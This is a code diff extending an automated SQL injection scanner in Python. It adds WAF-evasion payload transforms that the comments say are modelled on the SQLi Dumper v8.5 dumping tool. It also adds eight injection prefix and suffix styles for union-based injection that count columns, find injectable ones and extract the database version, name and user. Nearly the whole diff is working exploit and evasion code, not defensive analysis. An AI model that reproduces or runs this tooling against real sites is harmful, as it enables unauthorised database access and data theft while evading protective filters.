@@ -48,6 +48,8 @@ class SQLiResult:
     confidence: float = 0.0  # 0.0 - 1.0
     injection_point: str = "url"  # url, cookie, header, post
     cookies_extracted: Dict[str, str] = field(default_factory=dict)
+    prefix: str = "'"  # injection prefix that worked (e.g. ', ", -1, 999999.9)
+    suffix: str = "-- -"  # injection suffix/comment that worked
 
 
 @dataclass 
@@ -220,9 +222,31 @@ class SQLiScanner:
     EVASION_TECHNIQUES = {
         "comment": lambda p: p.replace(" ", "/**/"),
         "double_url": lambda p: p.replace("'", "%2527"),
-        "mixed_case": lambda p: re.sub(r'(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP|HAVING|ORDER|BY|INTO)', 
-                                        lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p, flags=re.I),
+        "mixed_case": lambda p: re.sub(
+            r'(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP_CONCAT|GROUP|HAVING|ORDER|BY|INTO|DISTINCT|LIMIT|OFFSET|SUBSTRING|MID|LEFT|RIGHT|IFNULL|ISNULL|CAST|CONVERT)', 
+            lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())), p, flags=re.I),
         "inline_comment": lambda p: p.replace("UNION", "UN/*!50000ION*/").replace("SELECT", "SE/*!50000LECT*/"),
+        # Compound: /**/  +  mixed-case on ALL keywords AND function names (from SQLi Dumper v8.5 OfsKey)
+        "compound": lambda p: re.sub(
+            r'(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY|GROUP|HAVING|LIMIT|OFFSET|INTO|INSERT|UPDATE|DELETE|DROP|TABLE|CONCAT|GROUP_CONCAT|DISTINCT|ALL|NULL|CAST|CONVERT|IFNULL|ISNULL|SUBSTRING|MID|LEFT|RIGHT|CHAR|CHR|ASCII|ORD|COUNT|SUM|AVG|MIN|MAX|INFORMATION_SCHEMA|TABLE_NAME|COLUMN_NAME|TABLE_SCHEMA)',
+            lambda m: '/**/' + ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())) + '/**/',
+            p, flags=re.I),
+        # Function name obfuscation — mixed-case on common SQL functions (SQLi Dumper v8.5 style)
+        "func_obfuscation": lambda p: re.sub(
+            r'\b(version|database|current_user|system_user|user|concat|concat_ws|group_concat|substring|mid|left|right|length|char|chr|ascii|ord|count|sum|avg|coalesce|ifnull|isnull|replace|lower|upper|trim|hex|unhex|md5|sha1|aes_encrypt|aes_decrypt|load_file|benchmark|sleep|extractvalue|updatexml)\s*\(',
+            lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group()[:-1])) + '(',
+            p, flags=re.I),
+        # Double-encoded comments: /**/ → %2f**%2f  (bypasses WAFs that decode once)
+        "double_encoded_comment": lambda p: p.replace(" ", "%2f**%2f"),
+        # Full SQLi Dumper v8.5 compound: %2f**%2f + mixed-case on keywords + function obfuscation
+        "sqli_dumper_compound": lambda p: re.sub(
+            r'(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY|GROUP|HAVING|LIMIT|ALL|NULL|CONCAT|GROUP_CONCAT|DISTINCT|TABLE|INFORMATION_SCHEMA|TABLE_NAME|COLUMN_NAME|TABLE_SCHEMA)',
+            lambda m: '%2f**%2f' + ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group())) + '%2f**%2f',
+            re.sub(
+                r'\b(version|database|current_user|system_user|user|concat|group_concat|substring|char|ascii|count|ifnull|isnull|hex|md5|sha1|load_file|benchmark|sleep)\s*\(',
+                lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group()[:-1])) + '(',
+                p, flags=re.I),
+            flags=re.I),
     }
 
     # ── Smart parameter prioritization ──
@@ -937,12 +961,17 @@ class SQLiScanner:
 
     async def test_union_based(self, url: str, param_name: str, dbms: str,
                                 session: aiohttp.ClientSession) -> Optional[SQLiResult]:
-        """Test union-based SQL injection.
+        """Test union-based SQL injection with multiple prefix/suffix variants.
         
-        Steps:
-        1. Find column count via ORDER BY
-        2. Find injectable columns via UNION SELECT
-        3. Extract data through injectable columns
+        Tests 8 injection styles derived from SQLi Dumper v8.5:
+          1. String close: ' ... -- -
+          2. Numeric: -1 ... -- -
+          3. Float: 999999.9 ... (no suffix)
+          4. Float-string balanced: 999999.9' ... AND '0'='0
+          5. Float-string hash: 999999.9' ... AND '0'='0 #
+          6. Double-quote: 999999.9" ... AND "0"="0
+          7. Parenthesis: 999999.9) ... AND (0=0
+          8. Float-string dash: 999999.9' ... AND '0'='0--
         
         Returns:
             SQLiResult if vulnerable, None otherwise
@@ -955,92 +984,127 @@ class SQLiScanner:
             return None
         original_len = len(original_body)
         
-        # Step 1: Find column count with ORDER BY
-        column_count = 0
-        for i in range(1, 51):  # Test up to 50 columns
-            test_params = params.copy()
-            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-            test_params[param_name] = [f"{original}' ORDER BY {i}-- -"]
-            test_url = self._build_url(base, test_params)
-            
-            body, _ = await self._fetch(test_url, session)
-            if not body:
-                continue
-            
-            # Check for ORDER BY error (means we exceeded column count)
-            if any(p.search(body) for dbms_name, patterns in self.DBMS_ERRORS.items() 
-                   for p in patterns) or "Unknown column" in body:
-                column_count = i - 1
-                break
-            
-            # If response drastically changes, might have hit the limit
-            if abs(len(body) - original_len) > original_len * 0.5 and i > 1:
-                column_count = i - 1
-                break
+        # 8 prefix/suffix variants — (prefix, suffix, is_numeric, description)
+        UNION_STYLES = [
+            ("'", "-- -", False, "string_close"),
+            ("-1", "-- -", True, "numeric"),
+            ("999999.9", "", True, "float_bare"),
+            ("999999.9'", " AND '0'='0", False, "float_string_balanced"),
+            ("999999.9'", " AND '0'='0 #", False, "float_string_hash"),
+            ('999999.9"', ' AND "0"="0', False, "double_quote"),
+            ("999999.9)", " AND (0=0", True, "parenthesis"),
+            ("999999.9'", " AND '0'='0--", False, "float_string_dash"),
+        ]
         
-        if column_count < 1:
-            # Try numeric instead of string
-            for i in range(1, 30):
+        # Step 1: Find column count with ORDER BY (try each prefix)
+        column_count = 0
+        working_prefix = "'"
+        working_suffix = "-- -"
+        working_style = "string_close"
+        
+        for pfx, sfx, is_num, style_name in UNION_STYLES:
+            found_count = 0
+            for i in range(1, 51):  # up to 50 columns
                 test_params = params.copy()
                 original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-                test_params[param_name] = [f"{original} ORDER BY {i}-- -"]
-                test_url = self._build_url(base, test_params)
                 
+                if is_num:
+                    test_params[param_name] = [f"{pfx} ORDER BY {i}{sfx}"]
+                else:
+                    test_params[param_name] = [f"{original}{pfx} ORDER BY {i}{sfx}"]
+                    
+                test_url = self._build_url(base, test_params)
                 body, _ = await self._fetch(test_url, session)
                 if not body:
                     continue
                 
+                # ORDER BY error = exceeded column count
                 if any(p.search(body) for dbms_name, patterns in self.DBMS_ERRORS.items() 
-                       for p in patterns):
-                    column_count = i - 1
+                       for p in patterns) or "Unknown column" in body:
+                    found_count = i - 1
                     break
+                
+                # Drastic response length change
+                if abs(len(body) - original_len) > original_len * 0.5 and i > 1:
+                    found_count = i - 1
+                    break
+            
+            if found_count > 0:
+                column_count = found_count
+                working_prefix = pfx
+                working_suffix = sfx
+                working_style = style_name
+                logger.info(f"ORDER BY found {column_count} columns with style={style_name} for {url}")
+                break
         
         if column_count < 1:
             return None
         
         logger.info(f"Found {column_count} columns for {url} param={param_name}")
         
-        # Step 2: Find injectable columns with UNION SELECT
+        # Step 2: Find injectable columns with UNION SELECT (using the working prefix/suffix)
         null_list = ["NULL"] * column_count
         marker = f"0x{random.randint(100000, 999999):x}"
         injectable_cols = []
+        
+        # Determine if numeric-style injection (prefix replaces original value)
+        is_numeric_prefix = working_style in ("numeric", "float_bare", "parenthesis")
         
         for col_idx in range(column_count):
             test_cols = null_list.copy()
             test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
             
-            union_query = f"' UNION ALL SELECT {','.join(test_cols)}-- -"
+            union_select = f" UNION ALL SELECT {','.join(test_cols)}"
             
             test_params = params.copy()
             original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-            test_params[param_name] = [f"{original}{union_query}"]
-            test_url = self._build_url(base, test_params)
             
+            if is_numeric_prefix:
+                test_params[param_name] = [f"{working_prefix}{union_select}{working_suffix}"]
+            else:
+                test_params[param_name] = [f"{original}{working_prefix}{union_select}{working_suffix}"]
+            
+            test_url = self._build_url(base, test_params)
             body, _ = await self._fetch(test_url, session)
             if body and marker.replace("0x", "") in body:
                 injectable_cols.append(col_idx)
         
         if not injectable_cols:
-            # Try without quotes (numeric parameter)
-            for col_idx in range(column_count):
-                test_cols = null_list.copy()
-                test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
+            # If the ORDER BY style worked but UNION didn't reflect, try other styles for UNION step only
+            for pfx, sfx, is_num, style_name in UNION_STYLES:
+                if pfx == working_prefix and sfx == working_suffix:
+                    continue  # skip already-tried
+                for col_idx in range(column_count):
+                    test_cols = null_list.copy()
+                    test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
+                    
+                    union_select = f" UNION ALL SELECT {','.join(test_cols)}"
+                    
+                    test_params = params.copy()
+                    original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
+                    
+                    if is_num:
+                        test_params[param_name] = [f"{pfx}{union_select}{sfx}"]
+                    else:
+                        test_params[param_name] = [f"{original}{pfx}{union_select}{sfx}"]
+                    
+                    test_url = self._build_url(base, test_params)
+                    body, _ = await self._fetch(test_url, session)
+                    if body and marker.replace("0x", "") in body:
+                        injectable_cols.append(col_idx)
                 
-                union_query = f" UNION ALL SELECT {','.join(test_cols)}-- -"
-                
-                test_params = params.copy()
-                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-                test_params[param_name] = [f"-1{union_query}"]
-                test_url = self._build_url(base, test_params)
-                
-                body, _ = await self._fetch(test_url, session)
-                if body and marker.replace("0x", "") in body:
-                    injectable_cols.append(col_idx)
+                if injectable_cols:
+                    working_prefix = pfx
+                    working_suffix = sfx
+                    working_style = style_name
+                    is_numeric_prefix = style_name in ("numeric", "float_bare", "parenthesis")
+                    logger.info(f"UNION SELECT worked with alt style={style_name}")
+                    break
         
         if not injectable_cols:
             return None
         
-        logger.info(f"Injectable columns: {injectable_cols} for {url}")
+        logger.info(f"Injectable columns: {injectable_cols} for {url} style={working_style}")
         
         # Step 3: Extract basic info through injectable column
         result = SQLiResult(
@@ -1049,10 +1113,12 @@ class SQLiScanner:
             vulnerable=True,
             injection_type="union",
             dbms=dbms,
-            technique="UNION ALL SELECT",
+            technique=f"UNION ALL SELECT ({working_style})",
             column_count=column_count,
             injectable_columns=injectable_cols,
             confidence=0.90,
+            prefix=working_prefix,
+            suffix=working_suffix,
         )
         
         # Try to extract version, database, user
@@ -1091,10 +1157,14 @@ class SQLiScanner:
             else:
                 test_cols[injectable_col] = f"CONCAT({unique_start},0x7c,({query}),0x7c,{unique_end})"
             
-            union_query = f"' UNION ALL SELECT {','.join(test_cols)}-- -"
+            union_select = f" UNION ALL SELECT {','.join(test_cols)}"
             test_params = params.copy()
             original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
-            test_params[param_name] = [f"{original}{union_query}"]
+            
+            if is_numeric_prefix:
+                test_params[param_name] = [f"{working_prefix}{union_select}{working_suffix}"]
+            else:
+                test_params[param_name] = [f"{original}{working_prefix}{union_select}{working_suffix}"]
             test_url = self._build_url(base, test_params)
             
             body, _ = await self._fetch(test_url, session)
@@ -1106,7 +1176,7 @@ class SQLiScanner:
                     setattr(result, attr, match.group(1))
                     logger.info(f"Extracted {attr}: {match.group(1)}")
         
-        result.payload_used = f"UNION ALL SELECT with {column_count} columns"
+        result.payload_used = f"{working_prefix} UNION ALL SELECT ... {working_suffix}"
         return result
 
     async def test_time_based(self, url: str, param_name: str, 
